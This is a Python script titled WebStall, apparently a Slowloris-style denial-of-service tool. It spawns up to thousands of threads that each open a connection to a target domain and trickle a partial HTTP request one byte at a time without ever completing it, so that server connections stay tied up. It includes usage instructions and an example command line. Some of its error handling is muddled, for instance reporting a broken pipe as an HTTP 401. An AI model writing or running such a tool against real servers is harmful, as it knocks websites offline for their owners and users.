#!/usr/bin/python3
#: Title       : WebStall
#: Date        : 2018-12-17
#: Author      : "Kjetil Kristoffer Solberg" <post@ikjetil.no>
#: Version     : 0.1
#: Description : Stalls web servers.
#: Usage       : ./WebStall.py <domain> <threads> <delay sec>

#
# import
#
import ItsLog
import ItsHttp
import sys
import time
import threading
import socket
import errno

#
# Print App Header
#
print("###################################################")
print("## W E B - S T A L L                       v.0.1  #")
print("###################################################")
print("## Usage:                                          ")
print("##   ./WebStall.py <domain> <threads> <delay sec>  ")                       
print("## Example:                                        ")
print("##   ./WebStall.py www.mydomain.com 100 10         ")
print("##                                                 ")
#
# Global ApplicationLog object
#
AppLog = ItsLog.ItsApplicationLog()
Flag = True

#
# PrintToConsole method
#
def PrintToConsole(thread_number, msg):
    print("Thread %04d :: %s" % (thread_number, msg))

class WebStallThread (threading.Thread):
   def __init__(self, domain, delay_sec, thread_number):
      threading.Thread.__init__(self)
      self.domain = domain
      self.delay_sec = delay_sec
      self.thread_number = thread_number

   def run(self):
    ihttp = ItsHttp.ItsHttp()

    PrintToConsole(self.thread_number, "Creating HTTP Socket")
    s = ihttp.CreateHttpSocket()
    
    PrintToConsole(self.thread_number, "Connecting HTTP Socket")
    ihttp.ConnectHttpSocket(s, domain)
    
    PrintToConsole(self.thread_number, "Sending HTTP Data")

    sz = "GET / HTTP/1.1\nHOST: " + domain + "\n"  # + "\n" # Do not send the last linefeed
    si = 0
    slen = len(sz)
    do_exit = False
    global Flag
    try:
        while Flag == True and do_exit == False:
            if si > 0:
                if si < slen:
                    time.sleep(tts)
                else:
                    time.sleep(1)

            if si < slen:
                try:
                    ihttp.SendHttpSocket(s,sz[si:si+1])
                except socket.error as ex:
                    if ex.errno != errno.EPIPE:
                        PrintToConsole(self.thread_number, "Broken Pipe Error. Server Closed Connection.")
                        do_exit = True
                        break
                    elif ex.errno == 32:
                        PrintToConsole(self.thread_number, "HTTP Status Code = 401. Unauthorized.")
                        do_exit = True
                        break
                    else:
                        PrintToConsole(self.thread_number, "Unknown Error (%d)" % ex.errno)
                        do_exit = True
                        break
            
                si += 1
    except KeyboardInterrupt as ki:
        PrintToConsole(self.thread_number, "> Keyboard Interrupt <")
        Flag = False
        do_exit = True
        ihttp.CloseHttpSocket(s)
    
    PrintToConsole(self.thread_number, "Finished")

#
# Main 
#
print("> Starting <")
if ( len(sys.argv) != 4 ):
    AppLog.LogError("Invalid number of arguments!")
    AppLog.PrintToConsole()
    exit(1)

domain = "" #: domains
ttc = 1     #: threads
tts = 1     #: delay in seconds

try:
    domain = str(sys.argv[1]) #: domain
    ttc = int(sys.argv[2])    #: threads
    tts = int(sys.argv[3])    #: delay in seconds
except ValueError as ex:
    AppLog.LogError("One or more Invalid parameter!")
    AppLog.PrintToConsole()
    exit(3)

if ( ttc <= 0 or ttc >= 9999 ):
    AppLog.LogError("Invalid number of threads. Must be between 1 and 9999.")
    AppLog.PrintToConsole()
    exit(2)

print("> Creating Threads <")
thread_list = []
i = 0
while i < ttc:
    thread_list.append(WebStallThread(domain,tts,i+1))
    i += 1

print("> Running Threads <")
for a in thread_list:
    a.start()

print("> Waiting for Threads to Finish")
try:

    for a in thread_list:
        a.join()

except KeyboardInterrupt as ki:
    print("> Keyboard Interrupt <")
    print("> Waiting for Threads to Finish <")
    Flag = False
    for a in thread_list:
        a.join()

print("> End of Program <")
